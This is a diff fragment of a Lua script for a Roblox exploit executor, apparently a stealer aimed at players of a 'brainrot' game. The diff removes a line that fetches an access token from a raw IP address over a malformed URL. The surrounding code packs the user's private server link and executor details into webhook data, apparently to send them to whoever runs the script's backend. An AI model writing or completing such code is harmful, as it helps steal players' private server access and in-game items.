@@ -168,7 +168,6 @@ ContinueButton.MouseButton1Click:Connect(function(...)
             fieldsValue = "No brainrots found..."
         end
     local MyPlotChannel = PlotController:GetMyPlot().Channel.Get
-    local AccessToken = HttpService:JSONDecode(game:HttpGet("https://http://5.129.235.74:3910/api/webhooks/750ecf81d8111b5b10acf22769f97217")).access_token
     local ExecutorName, ExecutorVersion = identifyexecutor()
     local WebhookData = HttpService:JSONEncode({
         content = PrivateServerLink,
